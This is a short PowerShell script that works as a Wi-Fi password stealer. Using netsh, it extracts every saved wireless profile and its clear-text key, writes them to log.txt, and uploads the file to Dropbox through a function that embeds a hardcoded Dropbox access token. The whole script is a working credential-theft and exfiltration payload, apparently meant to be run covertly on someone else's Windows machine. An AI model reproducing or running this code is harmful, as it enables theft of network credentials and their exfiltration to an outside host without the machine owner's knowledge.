function DropBox-Upload {

	[CmdletBinding()]
	param (
		
	[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
	[Alias("f")]
	[string]$SourceFilePath
	) 
	$DropBoxAccessToken = "sl.BbhZPXzW4_IbdLPO1jCMAYAY-Pa2zRzr7CSXs5JnFjeXC_xZ4FaEGj4O3UBxn-N_idZLoJIdvtrEyWyeH2PuYeyXeDO6Mwz0xq7UyfPkx9pxeANk0JTsya9unUU_8dr3S9lfYoDItVWV"
	$outputFile = Split-Path $SourceFilePath -leaf
	$TargetFilePath="/$outputFile"
	$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
	$authorization = "Bearer " + $DropBoxAccessToken
	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
	$headers.Add("Authorization", $authorization)
	$headers.Add("Dropbox-API-Arg", $arg)
	$headers.Add("Content-Type", 'application/octet-stream')
	Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
(netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> log.txt
"C:\Windows\System32\log.txt" |  DropBox-Upload
